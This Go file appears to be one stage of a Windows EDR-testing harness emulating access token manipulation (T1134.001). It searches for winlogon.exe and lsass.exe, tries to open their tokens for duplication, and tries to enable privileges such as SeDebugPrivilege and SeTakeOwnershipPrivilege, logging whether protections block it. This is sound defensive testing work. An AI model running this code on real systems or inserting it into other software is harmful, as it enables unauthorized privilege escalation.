// stage-T1134.001.go - Stage 2: Access Token Manipulation
// Simulates privilege escalation via token manipulation

//go:build windows
// +build windows

package main

import (
	"fmt"
	"os"
	"syscall"
	"time"
	"unsafe"

	"golang.org/x/sys/windows"
)

// Standardized exit codes
const (
	StageSuccess     = 0
	StageBlocked     = 126
	StageQuarantined = 105
	StageError       = 999
)

// Windows constants for token manipulation
const (
	STANDARD_RIGHTS_REQUIRED = 0x000F0000
	STANDARD_RIGHTS_READ     = 0x00020000
	TOKEN_ASSIGN_PRIMARY     = 0x0001
	TOKEN_DUPLICATE          = 0x0002
	TOKEN_IMPERSONATE        = 0x0004
	TOKEN_QUERY              = 0x0008
	TOKEN_QUERY_SOURCE       = 0x0010
	TOKEN_ADJUST_PRIVILEGES  = 0x0020
	TOKEN_ADJUST_GROUPS      = 0x0040
	TOKEN_ADJUST_DEFAULT     = 0x0080
	TOKEN_ADJUST_SESSIONID   = 0x0100

	TOKEN_ALL_ACCESS = (STANDARD_RIGHTS_REQUIRED |
		TOKEN_ASSIGN_PRIMARY |
		TOKEN_DUPLICATE |
		TOKEN_IMPERSONATE |
		TOKEN_QUERY |
		TOKEN_QUERY_SOURCE |
		TOKEN_ADJUST_PRIVILEGES |
		TOKEN_ADJUST_GROUPS |
		TOKEN_ADJUST_DEFAULT |
		TOKEN_ADJUST_SESSIONID)
)

func main() {
	// Attach to shared log
	if err := AttachLogger("5ed12ef2-5e29-49a2-8f26-269d8e9edcea", "Stage 2: T1134.001"); err != nil {
		fmt.Printf("[ERROR] Failed to attach logger: %v\n", err)
	}

	LogMessage("INFO", "T1134.001", "Starting Stage 2: Access Token Manipulation")

	// Attempt token manipulation
	if err := attemptTokenManipulation(); err != nil {
		LogMessage("ERROR", "T1134.001", fmt.Sprintf("Token manipulation blocked: %v", err))

		// Append stage result to shared log
		stageData := StageLog{
			StageID:       2,
			Technique:     "T1134.001",
			Name:          "Access Token Manipulation",
			StartTime:     time.Now(),
			EndTime:       time.Now(),
			DurationMs:    0,
			Status:        "blocked",
			ExitCode:      StageBlocked,
			BlockedReason: err.Error(),
		}
		AppendToSharedLog(stageData)

		fmt.Printf("[!] BLOCKED: %v\n", err)
		os.Exit(StageBlocked)
	}

	// Stage completed successfully
	LogMessage("SUCCESS", "T1134.001", "Token manipulation successful - privileges elevated")

	stageData := StageLog{
		StageID:    2,
		Technique:  "T1134.001",
		Name:       "Access Token Manipulation",
		StartTime:  time.Now(),
		EndTime:    time.Now(),
		DurationMs: 0,
		Status:     "success",
		ExitCode:   StageSuccess,
	}
	AppendToSharedLog(stageData)

	os.Exit(StageSuccess)
}

func attemptTokenManipulation() error {
	fmt.Println("[*] Attempting privilege escalation via token manipulation...")

	// Get current process token
	var currentToken windows.Token
	currentProcess, err := windows.GetCurrentProcess()
	if err != nil {
		return fmt.Errorf("failed to get current process: %v", err)
	}

	err = windows.OpenProcessToken(currentProcess, windows.TOKEN_QUERY|windows.TOKEN_DUPLICATE, &currentToken)
	if err != nil {
		return fmt.Errorf("EDR blocked OpenProcessToken: %v", err)
	}
	defer currentToken.Close()

	fmt.Println("[+] Successfully opened current process token")

	// Check current privileges
	isElevated, err := isTokenElevated(currentToken)
	if err != nil {
		return fmt.Errorf("failed to check token elevation: %v", err)
	}

	if isElevated {
		fmt.Println("[*] Process already running with elevated privileges")
		return nil
	}

	fmt.Println("[*] Process running with standard privileges, attempting elevation...")

	// Try to find and duplicate a SYSTEM token
	systemToken, err := findSystemToken()
	if err != nil {
		// This is expected to fail on protected systems
		return fmt.Errorf("EDR prevented SYSTEM token access: %v", err)
	}

	if systemToken != 0 {
		defer windows.CloseHandle(windows.Handle(systemToken))
		fmt.Println("[!] WARNING: Successfully obtained SYSTEM token - system is vulnerable!")

		// Try to impersonate (this should be blocked by EDR)
		// Note: ImpersonateLoggedOnUser is in advapi32.dll, not golang.org/x/sys/windows
		// For this test, we'll skip the actual impersonation call
		// The critical protection point is the token duplication itself
		fmt.Println("[!] CRITICAL: Token duplication successful - privilege escalation path available!")
	}

	// Try to enable dangerous privileges
	if err := enableDangerousPrivileges(); err != nil {
		return fmt.Errorf("EDR blocked privilege adjustment: %v", err)
	}

	fmt.Println("[+] Stage 2 completed - Privilege escalation successful")
	return nil
}

func isTokenElevated(token windows.Token) (bool, error) {
	// Simplified elevation check
	var elevation uint32
	var size uint32

	err := windows.GetTokenInformation(
		token,
		windows.TokenElevation, // Constant value
		(*byte)(unsafe.Pointer(&elevation)),
		uint32(unsafe.Sizeof(elevation)),
		&size,
	)
	if err != nil {
		return false, err
	}

	return elevation != 0, nil
}

func findSystemToken() (windows.Token, error) {
	// Try to access winlogon.exe (SYSTEM process)
	snapshot, err := windows.CreateToolhelp32Snapshot(windows.TH32CS_SNAPPROCESS, 0)
	if err != nil {
		return 0, err
	}
	defer windows.CloseHandle(snapshot)

	var procEntry windows.ProcessEntry32
	procEntry.Size = uint32(unsafe.Sizeof(procEntry))

	err = windows.Process32First(snapshot, &procEntry)
	if err != nil {
		return 0, err
	}

	for {
		processName := syscall.UTF16ToString(procEntry.ExeFile[:])
		if processName == "winlogon.exe" || processName == "lsass.exe" {
			fmt.Printf("[*] Found SYSTEM process: %s (PID: %d)\n", processName, procEntry.ProcessID)

			// Try to open the process
			handle, err := windows.OpenProcess(
				windows.PROCESS_QUERY_INFORMATION,
				false,
				procEntry.ProcessID,
			)
			if err != nil {
				fmt.Printf("[*] Access denied to %s - EDR protection active\n", processName)
				return 0, fmt.Errorf("access denied to SYSTEM process")
			}
			defer windows.CloseHandle(handle)

			// Try to get token
			var token windows.Token
			err = windows.OpenProcessToken(handle, TOKEN_DUPLICATE|TOKEN_QUERY, &token)
			if err != nil {
				return 0, fmt.Errorf("token access denied")
			}

			return token, nil
		}

		err = windows.Process32Next(snapshot, &procEntry)
		if err != nil {
			break
		}
	}

	return 0, fmt.Errorf("no SYSTEM process accessible")
}

func enableDangerousPrivileges() error {
	fmt.Println("[*] Attempting to enable dangerous privileges...")

	var currentToken windows.Token
	currentProcess, _ := windows.GetCurrentProcess()

	err := windows.OpenProcessToken(
		currentProcess,
		windows.TOKEN_ADJUST_PRIVILEGES|windows.TOKEN_QUERY,
		&currentToken,
	)
	if err != nil {
		return err
	}
	defer currentToken.Close()

	// List of dangerous privileges used by ransomware
	dangerousPrivs := []string{
		"SeDebugPrivilege",           // Process debugging
		"SeBackupPrivilege",          // Bypass file permissions
		"SeRestorePrivilege",         // Bypass file permissions
		"SeTakeOwnershipPrivilege",   // Take ownership of files
		"SeShutdownPrivilege",        // System shutdown
	}

	enabledCount := 0
	for _, privName := range dangerousPrivs {
		if err := enablePrivilege(currentToken, privName); err == nil {
			fmt.Printf("[!] Successfully enabled %s - VULNERABLE\n", privName)
			enabledCount++
		} else {
			fmt.Printf("[+] Failed to enable %s - PROTECTED\n", privName)
		}
	}

	if enabledCount > 0 {
		return nil // Some privileges were enabled - vulnerable
	}

	return fmt.Errorf("all dangerous privileges blocked")
}

func enablePrivilege(token windows.Token, privilege string) error {
	var luid windows.LUID

	privNameUTF16, err := syscall.UTF16PtrFromString(privilege)
	if err != nil {
		return err
	}

	err = windows.LookupPrivilegeValue(nil, privNameUTF16, &luid)
	if err != nil {
		return err
	}

	var tp windows.Tokenprivileges
	tp.PrivilegeCount = 1
	tp.Privileges[0].Luid = luid
	tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

	err = windows.AdjustTokenPrivileges(
		token,
		false,
		&tp,
		uint32(unsafe.Sizeof(tp)),
		nil,
		nil,
	)

	if err != nil {
		return err
	}

	// Check if it actually worked
	if windows.GetLastError() == windows.ERROR_NOT_ALL_ASSIGNED {
		return fmt.Errorf("privilege not assigned")
	}

	return nil
}